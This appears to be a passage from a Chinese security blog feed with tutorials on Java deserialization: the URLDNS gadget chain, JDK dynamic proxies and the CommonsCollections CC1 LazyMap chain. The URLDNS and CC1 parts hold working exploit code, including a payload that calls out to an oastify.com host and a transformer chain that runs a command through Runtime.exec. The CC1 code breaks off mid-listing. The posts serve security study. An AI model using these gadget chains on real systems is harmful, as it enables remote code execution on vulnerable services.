src="/2023/04/27/file-upload/ion/image-20230922235145931.png" alt="image-20230922235145931"></p><p>如果key为空，返回0，不为空就计算<code>(h = key.hashCode()) ^ (h &gt;&gt;&gt; 16)</code>。</p><p>根据payload，里面调用了ht.put方法，传参为(URL，u)：<img src="/2023/04/27/file-upload/ion/image-20230923231545863.png" alt="image-20230923231545863"></p><p>接着调用hash方法，再调用hashCode进行运算。跟到URL类中查看hashCode方法：</p><p><img src="/2023/04/27/file-upload/ion/image-20230924001116818.png" alt="image-20230924001116818"></p><p>最终return了一个hashCode，由handler.hashCode计算而来，而handler又是URLStreamHandler类的一个方法：</p><p><img src="/2023/04/27/file-upload/ion/image-20230924001228951.png" alt="image-20230924001228951"></p><p>接下来到URLStreamHandler中查看hashCode方法：</p><p><img src="/2023/04/27/file-upload/ion/image-20230924001318406.png" alt="image-20230924001318406"></p><p>这里的u就是前文提到的put传入的第一个参数—url类对象，再跟进getHostAddress方法：</p><p><img src="/2023/04/27/file-upload/ion/image-20230924001409222.png" alt="image-20230924001409222"></p><p>到这里已经很清楚了，根据传入参数，来获取其ip地址，也就是进行DNS查询。</p><p>整个的gadget为：</p><ul><li>HashMap-&gt;readObject()</li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ul><p>接下来在SerializationTest类中添加payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);<br>    HashMap&lt;URL,Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>    hashMap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://www.4jofyim09mcvopinp2px0ytfa6gx4nsc.oastify.com&quot;</span>),<span class="hljs-number">1</span>);<br>    System.out.println(person);<br>    serialize(person);<br>&#125;<br></code></pre></td></tr></table></figure><p>进行序列化操作：<br><img src="/2023/04/27/file-upload/ion/image-20230924103847827.png" alt="image-20230924103847827"></p><p>注意，这里在序列化时，就已经出现了DNGlog，而非预想的反序列化。</p><p>通过debug来排查一下问题，首先在hashMap.put这行下断点，跟进put方法：</p><p><img src="/2023/04/27/file-upload/ion/image-20230924104734947.png" alt="image-20230924104734947"></p><p>进到hash方法里：</p><p><img src="/2023/04/27/file-upload/ion/image-20230924104802962.png" alt="image-20230924104802962"></p><p>接下来进入到hashCode:</p><p><img src="/2023/04/27/file-upload/ion/image-20230924104826082.png" alt="image-20230924104826082"></p><p>可以看到，在这个if判断中，hashCode默认为-1，因此直接进到了handler.hashCode中：</p><p><img src="/2023/04/27/file-upload/ion/image-20230924104935546.png" alt="image-20230924104935546"></p><p>最终调用getHostAddress方法，触发了DNS请求。</p><p>改进的方法也很简单，修改hashCode的值使其不等于-1，最后再改回-1即可，由于hashCode是new URL.hashCode(),这里利用反射将其进行修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Serialize;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Person person = new Person(&quot;aa&quot;,22);</span><br><span class="hljs-comment">        HashMap&lt;URL,Integer&gt; hashMap = new HashMap&lt;URL, Integer&gt;();</span><br><span class="hljs-comment">        hashMap.put(new URL(&quot;http://www.7oweiw0ttcqt4h6gwsorviguoluci26r.oastify.com&quot;),1);</span><br><span class="hljs-comment">        System.out.println(person);</span><br><span class="hljs-comment">        serialize(person);</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);<br>        HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br>        <span class="hljs-comment">// 这里不要发起请求</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://jxkqr8952oz5dtfs54x34up6xx3orhf6.oastify.com&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcodefile.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcodefile.set(url,<span class="hljs-number">1234</span>);<br>        hashmap.put(url,<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性</span><br>        hashcodefile.set(url,-<span class="hljs-number">1</span>);<br>        serialize(hashmap);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>修改之后，反序列化操作时才会进行DNS请求：</p><p><img src="/2023/04/27/file-upload/ion/image-20230925113805245.png" alt="image-20230925113805245"></p><p>在URL的hashCode下个断点：</p><p><img src="/2023/04/27/file-upload/ion/image-20230925132151337.png" alt="image-20230925132151337"></p><p>看到hashCode被修改为1234，因此直接return，不进行请求。</p><p>同样反序列化时debug看下：</p><p><img src="/2023/04/27/file-upload/ion/image-20230925133731671.png" alt="image-20230925133731671"></p><p>走到了getHostAddress这个方法，成功发起请求。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>urldns</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化-JDK动态代理</title>
    <link href="/2024/07/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <url>/2024/07/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="java反序列化-JDK动态代理"><a href="#java反序列化-JDK动态代理" class="headerlink" title="java反序列化-JDK动态代理"></a>java反序列化-JDK动态代理</h1><h2 id="java代理模式"><a href="#java代理模式" class="headerlink" title="java代理模式"></a>java代理模式</h2><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>java静态代理大概分为如下步骤：</p><ul><li>定义业务接口；</li><li>被代理类实现业务接口；</li><li>定义代理类并实现业务接口；</li><li>最后便可通过客户端进行调用，也就是一个main的启动器。</li></ul><h4 id="业务接口："><a href="#业务接口：" class="headerlink" title="业务接口："></a>业务接口：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.StaticProxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String name)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="被代理类实现业务接口："><a href="#被代理类实现业务接口：" class="headerlink" title="被代理类实现业务接口："></a>被代理类实现业务接口：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.StaticProxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;insert into database : &quot;</span>+name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="定义代理类并实现业务接口"><a href="#定义代理类并实现业务接口" class="headerlink" title="定义代理类并实现业务接口"></a>定义代理类并实现业务接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.StaticProxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>&#123;<br>    <span class="hljs-keyword">private</span> UserService userService;<span class="hljs-comment">//被代理对象</span><br>    <br>    <span class="hljs-comment">//构造方法传入被代理对象</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserServiceProxy</span><span class="hljs-params">(UserService userService)</span>&#123;<br>        <span class="hljs-built_in">this</span>.userService = userService;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;prepare to insert &quot;</span>);<br>        userService.add(name);<br>        System.out.println(<span class="hljs-string">&quot;insert finished&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="main启动器"><a href="#main启动器" class="headerlink" title="main启动器"></a>main启动器</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.StaticProxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProxy</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-type">UserServiceProxy</span> <span class="hljs-variable">userServiceProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceProxy</span>(userService);<br>        userServiceProxy.add(<span class="hljs-string">&quot;test&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实现结果如下：</p><p><img src="/2023/04/27/file-upload/image-20230925165618835.png" alt="image-20230925165618835"></p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>静态代理在代理类和被代理类实现了相同的接口，导致代码的重复，也使得效率大大降低，因此出现了动态代理。</p><p><strong>动态代理在程序运行期间根据需要动态创建代理类及其实例来完成具体的功能</strong></p><p>其实现大概分为如下几步：</p><ul><li>创建被代理的接口和类；</li><li>创建InvocationHandler接口的实现类，在invoke方法中实现代理逻辑；</li><li>通过Proxy的静态方法<code>newProxyInstance( ClassLoaderloader, Class[] interfaces, InvocationHandler h)</code>创建一个代理对象</li><li>使用代理对象</li></ul><p>接下来使用动态代理实现上面的功能。</p><h4 id="被代理的接口和类"><a href="#被代理的接口和类" class="headerlink" title="被代理的接口和类"></a>被代理的接口和类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.DynamicProxy;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String name)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.DynamicProxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;insert into database : &quot;</span>+name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="创建InvocationHandler接口的实现类，在invoke方法中实现逻辑"><a href="#创建InvocationHandler接口的实现类，在invoke方法中实现逻辑" class="headerlink" title="创建InvocationHandler接口的实现类，在invoke方法中实现逻辑"></a>创建InvocationHandler接口的实现类，在invoke方法中实现逻辑</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.DynamicProxy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">private</span> Object target;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyInvocationHandler</span><span class="hljs-params">(Object target)</span>&#123;<br>        <span class="hljs-built_in">this</span>.target = target;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span class="hljs-string">&quot;prepare to insert&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> method.invoke(target,args);<br>        System.out.println(<span class="hljs-string">&quot;insert finished&quot;</span>);<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>静态代理中核心部分功能在invoke方法中进行了实现。</p><h4 id="通过Proxy的静态方法newProxyInstance-ClassLoaderloader-Class-interfaces-InvocationHandler-h-创建一个代理对象并使用该代理对象"><a href="#通过Proxy的静态方法newProxyInstance-ClassLoaderloader-Class-interfaces-InvocationHandler-h-创建一个代理对象并使用该代理对象" class="headerlink" title="通过Proxy的静态方法newProxyInstance( ClassLoaderloader, Class[] interfaces, InvocationHandler h)创建一个代理对象并使用该代理对象"></a>通过Proxy的静态方法<code>newProxyInstance( ClassLoaderloader, Class[] interfaces, InvocationHandler h)</code>创建一个代理对象并使用该代理对象</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Proxy.DynamicProxy;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProxy</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-type">MyInvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyInvocationHandler</span>(target);<br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">proxyObject</span> <span class="hljs-operator">=</span> (UserService) Proxy.newProxyInstance(target.getClass().getClassLoader(),target.getClass().getInterfaces(),handler);<br>        proxyObject.add(<span class="hljs-string">&quot;dynamic test&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/image-20230926093138959.png" alt="image-20230926093138959"></p><p>这里首先是一个真实的实现类，接着实例化一个代理角色，并且设置要代理的对象，即target，最后调用add方法。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化CommonsCollections-CC1链(下)</title>
    <link href="/2024/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections-CC1%E9%93%BE(%E4%B8%8B)/"/>
    <url>/2024/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections-CC1%E9%93%BE(%E4%B8%8B)/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化CommonsCollections-CC1链-下"><a href="#Java反序列化CommonsCollections-CC1链-下" class="headerlink" title="Java反序列化CommonsCollections-CC1链(下)"></a>Java反序列化CommonsCollections-CC1链(下)</h1><h2 id="LazyMap版CC1链分析"><a href="#LazyMap版CC1链分析" class="headerlink" title="LazyMap版CC1链分析"></a>LazyMap版CC1链分析</h2><h3 id="寻找链尾"><a href="#寻找链尾" class="headerlink" title="寻找链尾"></a>寻找链尾</h3><p>还是从InvokerTransformer中的transform方法看起，findusage：</p><p><img src="/2023/04/27/file-upload/20231013165933662.png" alt="image-20231013165933662"></p><p>看到LazyMap类中存在一个public的get方法，里面factory调用了transform。</p><h3 id="寻找完整链子"><a href="#寻找完整链子" class="headerlink" title="寻找完整链子"></a>寻找完整链子</h3><p>往上看看factory在哪里定义：</p><p><img src="/2023/04/27/file-upload/20231013170227422.png" alt="image-20231013170227422"></p><p>这里看到decorate方法，跟TransformMap利用链中的一样，接下来尝试由此开始编写简单的EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.javafx.collections.MappingChange;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Objects;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMapEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        Map&lt;Objects,Objects&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map,invokerTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span>c.getDeclaredMethod(<span class="hljs-string">&quot;get&quot;</span>, Object.class);<br>        method.invoke(decorateMap,runtime);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/20231013152309515.png" alt="image-20231013152309515"></p><p>成功执行命令。</p><p>这里继续找找LazyMap中get方法的调用：</p><p><img src="/2023/04/27/file-upload/20231013162122202.png" alt="image-20231013162122202"></p><p>发现在AnnotationInvocationHandler中的invoke方法里也用到了get方法，并且该类中还有readObject，可以作为入口类。</p><h2 id="手写EXP"><a href="#手写EXP" class="headerlink" title="手写EXP"></a>手写EXP</h2><p>现在的目的是触发AnnotationInvocationHandler.invoke()，立刻想到动态代理。</p><p>如果一个类被动态代理了，要通过代理调用该类的方法，就必须使用到这里的invoke方法。</p><p>在 AnnotationinvocationHandler类下，因为 this.memberValues 可控(在实例化时传入)， 而且在该类的 readObject函数中，也调用了</p><p>memberValues。所以可以利用反射，将生成的代理类赋值给 memberValues。当调用代理对象的方法时，就会执行invoke()方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMapEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span 